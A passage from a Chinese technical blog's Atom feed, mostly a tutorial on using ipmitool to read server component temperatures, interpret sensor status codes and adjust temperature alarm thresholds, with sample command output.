class="line">DataDigest: None</span><br><span class="line">MaxRecvDataSegmentLength: 262144</span><br><span class="line">MaxXmitDataSegmentLength: 1048576</span><br><span class="line">FirstBurstLength: 262144</span><br><span class="line">MaxBurstLength: 1048576</span><br><span class="line">ImmediateData: Yes</span><br><span class="line">InitialR2T: No</span><br><span class="line">MaxOutstandingR2T: 1</span><br><span class="line">************************</span><br><span class="line">Attached SCSI devices:</span><br><span class="line">************************</span><br><span class="line">Host Number: 25State: running</span><br><span class="line">scsi25 Channel 00 Id 0 Lun: 0</span><br><span class="line">        Attached scsi disk sdeState: running</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;h4 id=&quot;iSCSI&amp;#x5
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>i通过ipmitool获取各元件的温度信息和检查电源模块状态</title>
    <link href="https://jiemin.wang/2019/03/11/ipmitool/"/>
    <id>https://jiemin.wang/2019/03/11/ipmitool/</id>
    <published>2019-03-11T13:02:11.000Z</published>
    <updated>2019-03-11T13:20:00.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><h4 id="ipmitool&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5404;&#x4E2A;&#x5143;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x4F55;&#x5224;&#x65AD;&#x5404;&#x4E2A;&#x7EC4;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#xFF0C;&#x5404;&#x4E2A;&#x7EC4;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#x662F;&#x5426;OK&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x6E29;&#x5EA6;&#x8FC7;&#x9AD8;&#x6216;&#x8005;&#x8FC7;&#x4F4E;&#x7684;&#x5143;&#x4EF6;&#x9700;&#x8981;&#x544A;&#x8B66;&#xFF1F;"><a href="#ipmitool&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5404;&#x4E2A;&#x5143;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x4F55;&#x5224;&#x65AD;&#x5404;&#x4E2A;&#x7EC4;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#xFF0C;&#x5404;&#x4E2A;&#x7EC4;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#x662F;&#x5426;OK&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x6E29;&#x5EA6;&#x8FC7;&#x9AD8;&#x6216;&#x8005;&#x8FC7;&#x4F4E;&#x7684;&#x5143;&#x4EF6;&#x9700;&#x8981;&#x544A;&#x8B66;&#xFF1F;" class="headerlink" title="ipmitool&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5404;&#x4E2A;&#x5143;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x4F55;&#x5224;&#x65AD;&#x5404;&#x4E2A;&#x7EC4;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#xFF0C;&#x5404;&#x4E2A;&#x7EC4;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#x662F;&#x5426;OK&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x6E29;&#x5EA6;&#x8FC7;&#x9AD8;&#x6216;&#x8005;&#x8FC7;&#x4F4E;&#x7684;&#x5143;&#x4EF6;&#x9700;&#x8981;&#x544A;&#x8B66;&#xFF1F;"></a>ipmitool&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5404;&#x4E2A;&#x5143;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x4F55;&#x5224;&#x65AD;&#x5404;&#x4E2A;&#x7EC4;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#xFF0C;&#x5404;&#x4E2A;&#x7EC4;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#x662F;&#x5426;OK&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x6E29;&#x5EA6;&#x8FC7;&#x9AD8;&#x6216;&#x8005;&#x8FC7;&#x4F4E;&#x7684;&#x5143;&#x4EF6;&#x9700;&#x8981;&#x544A;&#x8B66;&#xFF1F;</h4><h2 id="&#x83B7;&#x53D6;&#x5404;&#x4E2A;&#x5143;&#x4EF6;&#x6E29;&#x5EA6;&#x7684;&#x65B9;&#x6CD5;"><a href="#&#x83B7;&#x53D6;&#x5404;&#x4E2A;&#x5143;&#x4EF6;&#x6E29;&#x5EA6;&#x7684;&#x65B9;&#x6CD5;" class="headerlink" title="&#x83B7;&#x53D6;&#x5404;&#x4E2A;&#x5143;&#x4EF6;&#x6E29;&#x5EA6;&#x7684;&#x65B9;&#x6CD5;"></a>&#x83B7;&#x53D6;&#x5404;&#x4E2A;&#x5143;&#x4EF6;&#x6E29;&#x5EA6;&#x7684;&#x65B9;&#x6CD5;</h2><h4 id="&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x5143;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#x548C;&#x76F8;&#x5173;&#x7684;&#x72B6;&#x6001;"><a href="#&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x5143;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#x548C;&#x76F8;&#x5173;&#x7684;&#x72B6;&#x6001;" class="headerlink" title="&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x5143;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#x548C;&#x76F8;&#x5173;&#x7684;&#x72B6;&#x6001;"></a>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x5143;&#x4EF6;&#x7684;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#x548C;&#x76F8;&#x5173;&#x7684;&#x72B6;&#x6001;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># ipmitool sensor list </span></span><br><span class="line">CPU1 Temp        | 29.000     | degrees C  | ok    | 0.000     | 0.000     | 0.000     | 85.000    | 90.000    | 90.000    </span><br><span class="line">CPU2 Temp        | 33.000     | degrees C  | nr    | 10.000    | 10.000    | 10.000    | 30.000    | 30.000    | 30.000    </span><br><span class="line">PCH Temp         | 32.000     | degrees C  | ok    | 0.000     | 5.000     | 16.000    | 90.000    | 95.000    | 100.000   </span><br><span class="line">System Temp      | 30.000     | degrees C  | ok    | -10.000   | -5.000    | 0.000     | 80.000    | 85.000    | 90.000    </span><br><span class="line">Peripheral Temp  | 34.000     | degrees C  | ok    | -10.000   | -5.000    | 0.000     | 80.000    | 85.000    | 90.000    </span><br><span class="line">Vcpu1VRM Temp    | 28.000     | degrees C  | ok    | -5.000    | 0.000     | 5.000     | 95.000    | 100.000   | 105.000   </span><br><span class="line">Vcpu2VRM Temp    | 34.000     | degrees C  | ok    | -5.000    | 0.000     | 5.000     | 95.000    | 100.000   | 105.000   </span><br><span class="line">VmemABVRM Temp   | 29.000     | degrees C  | ok    | -5.000    | 0.000     | 5.000     | 95.000    | 100.000   | 105.000   </span><br><span class="line">VmemCDVRM Temp   | 28.000     | degrees C  | ok    | -5.000    | 0.000     | 5.000     | 95.000    | 100.000   | 105.000   </span><br><span class="line">VmemEFVRM Temp   | 31.000     | degrees C  | ok    | -5.000    | 0.000     | 5.000     | 95.000    | 100.000   | 105.000   </span><br><span class="line">VmemGHVRM Temp   | 30.000     | degrees C  | ok    | -5.000    | 0.000     | 5.000     | 95.000    | 100.000   | 105.000   </span><br><span class="line">P1-DIMMA1 Temp   | 27.000     | degrees C  | ok    | -5.000    | 0.000     | 5.000     | 80.000    | 85.000    | 90.000    </span><br><span class="line">P1-DIMMA2 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P1-DIMMB1 Temp   | 27.000     | degrees C  | ok    | -5.000    | 0.000     | 5.000     | 80.000    | 85.000    | 90.000    </span><br><span class="line">P1-DIMMB2 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P1-DIMMC1 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P1-DIMMC2 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P1-DIMMD1 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P1-DIMMD2 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P2-DIMME1 Temp   | 29.000     | degrees C  | ok    | -5.000    | 0.000     | 5.000     | 80.000    | 85.000    | 90.000    </span><br><span class="line">P2-DIMME2 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P2-DIMMF1 Temp   | 30.000     | degrees C  | ok    | -5.000    | 0.000     | 5.000     | 80.000    | 85.000    | 90.000    </span><br><span class="line">P2-DIMMF2 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P2-DIMMG1 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P2-DIMMG2 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P2-DIMMH1 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">P2-DIMMH2 Temp   | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">FAN1             | 4400.000   | RPM        | ok    | 300.000   | 500.000   | 700.000   | 25300.000 | 25400.000 | 25500.000 </span><br><span class="line">FAN2             | 4300.000   | RPM        | ok    | 300.000   | 500.000   | 700.000   | 25300.000 | 25400.000 | 25500.000 </span><br><span class="line">FAN3             | 4400.000   | RPM        | ok    | 300.000   | 500.000   | 700.000   | 25300.000 | 25400.000 | 25500.000 </span><br><span class="line">FAN4             | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">FAN5             | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">FAN6             | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">FANA             | 4400.000   | RPM        | ok    | 300.000   | 500.000   | 700.000   | 25300.000 | 25400.000 | 25500.000 </span><br><span class="line">FANB             | na         |            | na    | na        | na        | na        | na        | na        | na        </span><br><span class="line">12V              | 12.315     | Volts      | ok    | 10.173    | 10.299    | 10.740    | 12.945    | 13.260    | 13.386    </span><br><span class="line">5VCC             | 5.000      | Volts      | ok    | 4.246     | 4.298     | 4.480     | 5.390     | 5.546     | 5.598     </span><br><span class="line">3.3VCC           | 3.316      | Volts      | ok    | 2.789     | 2.823     | 2.959     | 3.554     | 3.656     | 3.690     </span><br><span class="line">VBAT             | 3.104      | Volts      | ok    | 2.376     | 2.480     | 2.584     | 3.494     | 3.598     | 3.676     </span><br><span class="line">Vcpu1            | 1.800      | Volts      | ok    | 1.242     | 1.260     | 1.395     | 1.899     | 2.088     | 2.106     </span><br><span class="line">Vcpu2            | 1.809      | Volts      | ok    | 1.242     | 1.260     | 1.395     | 1.899     | 2.088     | 2.106     </span><br><span class="line">VDIMMAB          | 1.200      | Volts      | ok    | 0.948     | 0.975     | 1.047     | 1.344     | 1.425     | 1.443     </span><br><span class="line">VDIMMCD          | 1.209      | Volts      | ok    | 0.948     | 0.975     | 1.047     | 1.344     | 1.425     | 1.443     </span><br><span class="line">VDIMMEF          | 1.209      | Volts      | ok    | 0.948     | 0.975     | 1.047     | 1.344     | 1.425     | 1.443     </span><br><span class="line">VDIMMGH          | 1.209      | Volts      | ok    | 0.948     | 0.975     | 1.047     | 1.344     | 1.425     | 1.443     </span><br><span class="line">5VSB             | 4.974      | Volts      | ok    | 4.246     | 4.298     | 4.480     | 5.390     | 5.546     | 5.598     </span><br><span class="line">3.3VSB           | 3.316      | Volts      | ok    | 2.789     | 2.823     | 2.959     | 3.554     | 3.656     | 3.690     </span><br><span class="line">1.5V PCH         | 1.509      | Volts      | ok    | 1.320     | 1.347     | 1.401     | 1.644     | 1.671     | 1.698     </span><br><span class="line">1.2V BMC         | 1.209      | Volts      | ok    | 1.020     | 1.047     | 1.092     | 1.344     | 1.371     | 1.398     </span><br><span class="line">1.05V PCH        | 1.050      | Volts      | ok    | 0.870     | 0.897     | 0.942     | 1.194     | 1.221     | 1.248     </span><br><span class="line">Chassis Intru    | 0x0        | discrete   | 0x0000| na        | na        | na        | na        | na        | na        </span><br><span class="line">PS1 Status       | 0x1        | discrete   | 0x0100| na        | na        | na        | na        | na        | na        </span><br><span class="line">PS2 Status       | 0x1        | discrete   | 0x0100| na        | na        | na        | na        | na        | na        </span><br><span class="line">AOC_SAS Temp     | 60.000     | degrees C  | ok    | -11.000   | -8.000    | -5.000    | 100.000   | 105.000   | 110.000   </span><br><span class="line">HDD Temp         | 29.000     | degrees C  | ok    | -11.000   | -8.000    | -5.000    | 50.000    | 55.000    | 60.000    </span><br><span class="line">HDD Status       | 0x1        | discrete   | 0x01ff| na        | na        | na        | na        | na        | na</span><br></pre></td></tr></tbody></table></figure><p>&#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x7B2C;&#x4E09;&#x5217;&#x7684;&#x503C;&#x4E2D;&#x6709;degree&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x7EDF;&#x8BA1;&#x7684;&#x662F;&#x6E29;&#x5EA6;&#x4FE1;&#x606F;&#x3002;</p><ul><li>&#x7B2C;&#x4E00;&#x5217;&#xFF1A; &#x4F20;&#x611F;&#x5668;&#x7684;&#x540D;&#x79F0;&#xFF0C;&#x6BD4;&#x5982;CPU1 Temp&#xFF0C;</li><li>&#x7B2C;&#x4E8C;&#x5217;: &#x8BE5;&#x5143;&#x4EF6;&#x7684;&#x5F53;&#x524D;&#x6E29;&#x5EA6;&#x503C;&#xFF0C;&#x6CE8;&#x610F;&#x6709;&#x65F6;&#x5019;&#x4F1A;&#x662F;na&#xFF0C;&#x5373;&#x53D6;&#x4E0D;&#x5230;&#x3002;</li><li>&#x7B2C;&#x56DB;&#x5217;&#xFF1A; &#x6E29;&#x5EA6;&#x7684;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#xFF0C;ok&#x8868;&#x793A;&#x6E29;&#x5EA6;&#x6B63;&#x5E38;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x8BE5;&#x72B6;&#x6001;&#x503C;&#x4E3A;nr&#xFF0C;&#x4E3A;non-recovery&#xFF0C;&#x4E0D;&#x53EF;&#x6062;&#x590D;&#x7684;&#x610F;&#x601D;</li></ul><p>&#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x6E29;&#x5EA6;&#x72B6;&#x6001;&#x6709;&#x4EE5;&#x4E0B;5&#x79CD;&#xFF1A;</p><ul><li>ok&#xFF1A;&#x6E29;&#x5EA6;&#x6B63;&#x5E38;</li><li>nc&#xFF1A; non-critical&#xFF0C;&#x6E29;&#x5EA6;&#x504F;&#x9AD8;&#xFF08;&#x6216;&#x8005;&#x504F;&#x4F4E;&#xFF09;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x592A;&#x4E25;&#x91CD;</li><li>cr&#xFF1A;critical&#xFF0C;&#x6E29;&#x5EA6;&#x592A;&#x9AD8;&#x6216;&#x8005;&#x6E29;&#x5EA6;&#x592A;&#x4F4E;&#xFF0C;&#x5F88;&#x4E25;&#x91CD;</li><li>nr&#xFF1A; non-recovery&#xFF0C;&#x6E29;&#x5EA6;&#x592A;&#x9AD8;&#x6216;&#x8005;&#x6E29;&#x5EA6;&#x592A;&#x4F4E;&#xFF0C;&#x9020;&#x6210;&#x4E0D;&#x53EF;&#x6062;&#x590D;&#x7684;&#x635F;&#x4F24;&#x3002;</li><li>na&#xFF1A;&#x6E29;&#x5EA6;&#x72B6;&#x6001;&#x4E0D;&#x660E;&#xFF0C;&#x6BD4;&#x8F83;&#x5C11;&#x89C1;&#x3002;<blockquote><p>&#x6CE8;&#x610F;ok &#x2013;&gt; nc &#x2013;&gt; cr &#x2013;&gt; nr &#x4ECE;&#x6B63;&#x5E38;&#xFF0C;&#x5230;&#x8D8A;&#x6765;&#x8D8A;&#x4E25;&#x91CD;&#x7684;&#x6E29;&#x5EA6;&#x95EE;&#x9898;&#x3002;</p></blockquote></li></ul><h2 id="&#x5982;&#x4F55;&#x89E6;&#x53D1;&#x6E29;&#x5EA6;&#x544A;&#x8B66;"><a href="#&#x5982;&#x4F55;&#x89E6;&#x53D1;&#x6E29;&#x5EA6;&#x544A;&#x8B66;" class="headerlink" title="&#x5982;&#x4F55;&#x89E6;&#x53D1;&#x6E29;&#x5EA6;&#x544A;&#x8B66;"></a>&#x5982;&#x4F55;&#x89E6;&#x53D1;&#x6E29;&#x5EA6;&#x544A;&#x8B66;</h2><p>&#x4ECB;&#x7ECD;&#x4E86;nc cr &#x548C;nr&#x4E09;&#x79CD;&#x72B6;&#x6001;&#xFF0C;&#x90FD;&#x8BF4;&#x6E29;&#x5EA6;&#x504F;&#x9AD8;&#x6216;&#x8005;&#x6E29;&#x5EA6;&#x504F;&#x4F4E;&#xFF0C;&#x90A3;&#x4E48;</p><ul><li>&#x6E29;&#x5EA6;&#x5230;&#x4EC0;&#x4E48;&#x7A0B;&#x5EA6;&#x72B6;&#x6001;&#x4F1A;&#x53D8;&#x6210;nc&#xFF0C;</li><li>&#x6E29;&#x5EA6;&#x5230;&#x4EC0;&#x4E48;&#x7A0B;&#x5EA6;&#x4F1A;&#x53D8;&#x6210;cr</li><li>&#x6E29;&#x5EA6;&#x5230;&#x4EC0;&#x4E48;&#x7A0B;&#x5EA6;&#x4F1A;&#x53D8;&#x6210;nr</li></ul><p>&#x663E;&#x7136;&#xFF0C;&#x5404;&#x4E2A;&#x5143;&#x4EF6;&#x7684;&#x72B6;&#x6001;&#x6539;&#x53D8;&#x662F;&#x6709;&#x6E29;&#x5EA6;&#x95E8;&#x9650;&#x503C;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x65B9;&#x6CD5;&#x67E5;&#x770B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># ipmitool sensor get &quot;CPU1 Temp&quot;</span></span><br><span class="line">Locating sensor record...</span><br><span class="line">Sensor ID              : CPU1 Temp (0x1)</span><br><span class="line"> Entity ID             : 3.1 (Processor)</span><br><span class="line"> Sensor Type (Threshold)  : Temperature (0x01)</span><br><span class="line"> Sensor Reading        : 29 (+/- 0) degrees C</span><br><span class="line"> Status                : ok</span><br><span class="line"> Nominal Reading       : 40.000</span><br><span class="line"> Normal Minimum        : -4.000</span><br><span class="line"> Normal Maximum        : 89.000</span><br><span class="line"> Upper non-recoverable : 90.000</span><br><span class="line"> Upper critical        : 90.000</span><br><span class="line"> Upper non-critical    : 85.000</span><br><span class="line"> Lower non-recoverable : 0.000</span><br><span class="line"> Lower critical        : 0.000</span><br><span class="line"> Lower non-critical    : 0.000</span><br><span class="line"> Positive Hysteresis   : 2.000</span><br><span class="line"> Negative Hysteresis   : 2.000</span><br><span class="line"> Minimum sensor range  : Unspecified</span><br><span class="line"> Maximum sensor range  : Unspecified</span><br><span class="line"> Event Message Control : Per-threshold</span><br><span class="line"> Readable Thresholds   : lnr lcr lnc unc ucr unr </span><br><span class="line"> Settable Thresholds   : lnr lcr lnc unc ucr unr </span><br><span class="line"> Threshold Read Mask   : lnr lcr lnc unc ucr unr </span><br><span class="line"> Assertion Events      : </span><br><span class="line"> Assertions Enabled    : ucr+ </span><br><span class="line"> Deassertions Enabled  : ucr+</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4ECE;&#x4E0A;&#x9762;&#x7684;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF1A;</p><ul><li>Upper non-critical 85 &#x5EA6;</li><li>Upper critical 90 &#x5EA6;</li><li>Upper non-recovery 90 &#x5EA6;</li><li>Lower non-critical 0 &#x5EA6;</li><li>Lower critical 0 &#x5EA6;</li><li>Lower non-recoverable</li></ul><p>&#x6709;&#x4E86;&#x95E8;&#x9650;&#x503C;&#xFF0C;&#x662F;&#x54EA;&#x79CD;&#x72B6;&#x6001;&#x5C31;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x4E86;&#x3002;</p><ul><li>[0,85]&#x4E4B;&#x95F4;&#x662F;&#xFF0C;&#x72B6;&#x6001;ok</li><li>[85,90] &#x72B6;&#x6001;&#x4E3A;nc</li><li>[90,] &#x72B6;&#x6001;&#x4E3A;nr &#xFF08;&#x56E0;&#x4E3A;cr&#x7684;&#x95E8;&#x9650;&#x548C;nr&#x7684;&#x95E8;&#x9650;&#x90FD;&#x662F;90&#xFF0C;&#x72B6;&#x6001;&#x53D6;nr&#xFF09;</li></ul><p>&#x4F4E;&#x6E29;&#x7684;&#x60C5;&#x51B5;&#x4E5F;&#x662F;&#x7C7B;&#x4F3C;&#x3002;</p><p>&#x5982;&#x4F55;&#x8BA9;&#x6E29;&#x5EA6;&#x72B6;&#x6001;&#x544A;&#x8B66;&#x5462;&#xFF0C;&#x5373;&#x53D8;&#x6210;nc&#x6216;&#x8005;cr&#x6216;&#x8005;nr&#x72B6;&#x6001;&#x5462;&#xFF1F;</p><p>ipmitool&#x63D0;&#x4F9B;&#x4E86;&#x65B9;&#x6CD5;&#x6765;&#x8BBE;&#x7F6E;&#x5404;&#x4E2A;&#x72B6;&#x6001;&#x7684;&#x95E8;&#x9650;&#x503C;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipmitool -I open sensor thresh <span class="string">&apos;CPU2 Temp&apos;</span> upper 20 30 90</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0A;&#x8FF0;&#x6307;&#x4EE4;&#x7684;&#x610F;&#x601D;&#x662F;&#x5C06;CPU2 Temp&#x5143;&#x4EF6;&#x7684;&#x544A;&#x8B66;&#x95E8;&#x9650;&#x4E2D;&#x7684;&#x6E29;&#x5EA6;&#x4E0A;&#x9650;&#x544A;&#x8B66;&#x95E8;&#x9650;&#x8BBE;&#x7F6E;&#x4E3A;20 30 &#x548C;90.</p><p>&#x4EE5;&#x4E3A;CPU&#x7684;&#x6E29;&#x5EA6;&#x662F;33&#x5EA6;&#x5DE6;&#x53F3;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#xFF0C;&#x5C06;&#x72B6;&#x6001;&#x53D8;&#x4E3A;nc&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># ipmitool -I open sensor thresh &apos;CPU2 Temp&apos; upper 20 40 90</span></span><br><span class="line">Locating sensor record <span class="string">&apos;CPU2 Temp&apos;</span>...</span><br><span class="line">Setting sensor <span class="string">&quot;CPU2 Temp&quot;</span> Upper Non-Critical threshold to 20.000</span><br><span class="line">Setting sensor <span class="string">&quot;CPU2 Temp&quot;</span> Upper Critical threshold to 40.000</span><br><span class="line">Setting sensor <span class="string">&quot;CPU2 Temp&quot;</span> Upper Non-Recoverable threshold to 90.000</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># ipmitool sensor list</span></span><br><span class="line">CPU2 Temp        | 33.000     | degrees C  | nc    | 10.000    | 10.000    | 10.000    | 20.000    | 40.000    | 90.000</span><br></pre></td></tr></tbody></table></figure><p>33&#x6444;&#x6C0F;&#x5EA6;&#xFF0C;&#x8D85;&#x8FC7;&#x4E86;20&#x5EA6;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x8981;&#x8D85;&#x8FC7;40&#x5EA6;&#xFF0C;&#x56E0;&#x6B64;&#x72B6;&#x6001;&#x662F;nc&#xFF0C;&#x5373;non-critical&#x3002;</p><p>&#x540C;&#x6837;&#x9053;&#x7406;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x544A;&#x8B66;&#x95E8;&#x9650;&#x8BBE;&#x7F6E;&#x4E3A; 20 30 90&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4F1A;&#x53D1;&#x73B0;&#x72B6;&#x6001;&#x4E3A;cr&#xFF0C;&#x5373;critical&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># ipmitool -I open sensor thresh &apos;CPU2 Temp&apos; upper 20 30 90</span></span><br><span class="line">Locating sensor record <span class="string">&apos;CPU2 Temp&apos;</span>...</span><br><span class="line">Setting sensor <span class="string">&quot;CPU2 Temp&quot;</span> Upper Non-Critical threshold to 20.000</span><br><span class="line">Setting sensor <span class="string">&quot;CPU2 Temp&quot;</span> Upper Critical threshold to 30.000</span><br><span class="line">Setting sensor <span class="string">&quot;CPU2 Temp&quot;</span> Upper Non-Recoverable threshold to 90.000</span><br><span class="line"></span><br><span class="line">root@node:~<span class="comment"># ipmitool sensor list </span></span><br><span class="line">CPU1 Temp        | 30.000     | degrees C  | ok    | 0.000     | 0.000     | 0.000     | 85.000    | 90.000    | 90.000    </span><br><span class="line">CPU2 Temp        | 33.000     | degrees C  | cr    | 10.000    | 10.000    | 10.000    | 20.000    | 30.000    | 